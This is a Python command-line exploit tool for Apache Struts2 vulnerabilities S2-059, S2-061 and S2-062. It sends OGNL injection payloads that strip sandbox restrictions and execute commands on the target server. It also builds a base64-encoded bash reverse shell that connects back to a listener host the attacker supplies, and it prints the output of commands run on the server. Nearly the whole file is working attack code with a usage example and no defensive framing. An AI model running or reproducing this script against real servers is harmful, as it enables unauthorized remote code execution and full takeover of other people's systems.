# encoding=utf-8，python3
import requests
import base64
import argparse
from lxml import etree
import re

class Targetvul:
    def __init__(self,url,ip,port,command=None):
        self.url=url
        self.ip=ip
        self.port=port
        self.cmd=command
        self.shell()
        self.s2_059()
        self.s2_061()
        self.s2_062(self.cmd)

    def shell(self):
        base_cmd = "bash -i >& /dev/tcp/" + str(self.ip) + "/" + str(self.port) + " 0>&1"
        base_cmd_byte = base_cmd.encode()
        mid_cmd = base64.b64encode(base_cmd_byte)
        self.final_cmd = "bash -c {echo," + mid_cmd.decode() + "}|{base64,-d}|{bash,-i}"

    def s2_059(self):
        payload059trigger = {
            "id": "%{(#context=#attr['struts.valueStack'].context).(#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.setExcludedClasses('')).(#ognlUtil.setExcludedPackageNames(''))}"
        }
        payload059 = {
            "id": "%{(#context=#attr['struts.valueStack'].context).(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)).(@java.lang.Runtime@getRuntime().exec('"+self.final_cmd+"'))}"
        }
        headers059 = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36'
        }
        requests.post(self.url, data=payload059trigger, headers=headers059)  # 触发s2-059命令执行漏洞
        if "has ben evaluated again" in requests.post(self.url, data=payload059,headers=headers059).text:  # 脚本执行服务器和监听服务器为同一台设备才会收到回包
            print("存在S2-059漏洞，反弹shell成功")
        else:
            print("不存在s2_059漏洞")
    def s2_061(self):
        payload061poc = '''
          ------WebKitFormBoundaryl7d1B1aGsV2wcZwF\r\nContent-Disposition: form-data; name="id"\r\n\r\n%{(#instancemanager=#application["org.apache.tomcat.InstanceManager"]).(#stack=#attr["com.opensymphony.xwork2.util.ValueStack.ValueStack"]).(#bean=#instancemanager.newInstance("org.apache.commons.collections.BeanMap")).(#bean.setBean(#stack)).(#context=#bean.get("context")).(#bean.setBean(#context)).(#macc=#bean.get("memberAccess")).(#bean.setBean(#macc)).(#emptyset=#instancemanager.newInstance("java.util.HashSet")).(#bean.put("excludedClasses",#emptyset)).(#bean.put("excludedPackageNames",#emptyset)).(#arglist=#instancemanager.newInstance("java.util.ArrayList")).(#arglist.add("id")).(#execute=#instancemanager.newInstance("freemarker.template.utility.Execute")).(#execute.exec(#arglist))}\r\n------WebKitFormBoundaryl7d1B1aGsV2wcZwF--'''
        payload061 = '''
           ------WebKitFormBoundaryl7d1B1aGsV2wcZwF\r\nContent-Disposition: form-data; name="id"\r\n\r\n%{(#instancemanager=#application["org.apache.tomcat.InstanceManager"]).(#stack=#attr["com.opensymphony.xwork2.util.ValueStack.ValueStack"]).(#bean=#instancemanager.newInstance("org.apache.commons.collections.BeanMap")).(#bean.setBean(#stack)).(#context=#bean.get("context")).(#bean.setBean(#context)).(#macc=#bean.get("memberAccess")).(#bean.setBean(#macc)).(#emptyset=#instancemanager.newInstance("java.util.HashSet")).(#bean.put("excludedClasses",#emptyset)).(#bean.put("excludedPackageNames",#emptyset)).(#arglist=#instancemanager.newInstance("java.util.ArrayList")).(#arglist.add("''' + self.final_cmd + '''")).(#execute=#instancemanager.newInstance("freemarker.template.utility.Execute")).(#execute.exec(#arglist))}\r\n------WebKitFormBoundaryl7d1B1aGsV2wcZwF--'''
        headers061 = {
            'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryl7d1B1aGsV2wcZwF',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36'
        }
        if "uid=" in requests.post(self.url, data=payload061poc, headers=headers061).text:
            print("存在S2-061漏洞，执行反弹shell")
            requests.post(self.url, data=payload061, headers=headers061)
    def s2_062(self,cmd):
        headers062 = {
                   "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36",
                   "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryl7d1B1aGsV2wcZwF"}
        payload062poc = "------WebKitFormBoundaryl7d1B1aGsV2wcZwF\r\nContent-Disposition: form-data; name=\"id\"\r\n\r\n%{\r\n(#request.map=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0) +\r\n(#request.map.setBean(#request.get('struts.valueStack')) == true).toString().substring(0,0) +\r\n(#request.map2=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0) +\r\n(#request.map2.setBean(#request.get('map').get('context')) == true).toString().substring(0,0) +\r\n(#request.map3=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0) +\r\n(#request.map3.setBean(#request.get('map2').get('memberAccess')) == true).toString().substring(0,0) +\r\n(#request.get('map3').put('excludedPackageNames',#@org.apache.commons.collections.BeanMap@{}.keySet()) == true).toString().substring(0,0) +\r\n(#request.get('map3').put('excludedClasses',#@org.apache.commons.collections.BeanMap@{}.keySet()) == true).toString().substring(0,0) +\r\n(#application.get('org.apache.tomcat.InstanceManager').newInstance('freemarker.template.utility.Execute').exec({'whoami'}))\r\n}\r\n------WebKitFormBoundaryl7d1B1aGsV2wcZwF\xe2\x80\x94"
        # print(payload062)
        if re.search('uid=0', requests.post(self.url, data=payload062poc, headers=headers062).text, flags=0) != None:
            print(f'[+]{url}疑似存在漏洞')
            if self.cmd==None:
                print("存在S2-062漏洞，请输入-c 参数，执行命令")
                exit()
            else:
                payload062 = "------WebKitFormBoundaryl7d1B1aGsV2wcZwF\r\nContent-Disposition: form-data; name=\"id\"\r\n\r\n%{\r\n(#request.map=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0) +\r\n(#request.map.setBean(#request.get('struts.valueStack')) == true).toString().substring(0,0) +\r\n(#request.map2=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0) +\r\n(#request.map2.setBean(#request.get('map').get('context')) == true).toString().substring(0,0) +\r\n(#request.map3=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0) +\r\n(#request.map3.setBean(#request.get('map2').get('memberAccess')) == true).toString().substring(0,0) +\r\n(#request.get('map3').put('excludedPackageNames',#@org.apache.commons.collections.BeanMap@{}.keySet()) == true).toString().substring(0,0) +\r\n(#request.get('map3').put('excludedClasses',#@org.apache.commons.collections.BeanMap@{}.keySet()) == true).toString().substring(0,0) +\r\n(#application.get('org.apache.tomcat.InstanceManager').newInstance('freemarker.template.utility.Execute').exec({'id'}))\r\n}\r\n------WebKitFormBoundaryl7d1B1aGsV2wcZwF\xe2\x80\x94".replace(
                    "exec({'id", "exec({'" + self.cmd)
                text=requests.post(self.url, data=payload062, headers=headers062)
                print(text.text)
                print("命令回显")
                try:
                    page = etree.HTML(text.text)
                    print(page)
                    data = page.xpath('//a[@id]/@id')
                    print(data)
                    print(data[0])
                except Exception as aa:
                    print(aa)
        else:
            exit("也不存在s2_061或s2_062,漏洞探测结束")

if __name__=='__main__':
    HelpMessage = argparse.ArgumentParser(description="S2-061  && S2-059 && s2-062", epilog='''
       Example:
       StrutsClass.py -u http://127.0.0.1:8080  -r 10.0.0.1 -p 3306 -c whoami
       ''')
    HelpMessage.add_argument('-r', '--remotehost',  help='remote listen host')
    HelpMessage.add_argument('-p', '--port',help='remote listen port')
    HelpMessage.add_argument('-u', '--url',help='target url')
    HelpMessage.add_argument('-c', '--cmd',help='exexute command')
    args = HelpMessage.parse_args()
    url = args.url
    ip = args.remotehost
    port = args.port
    command=args.cmd
    Targetvul(url,ip,port,command)

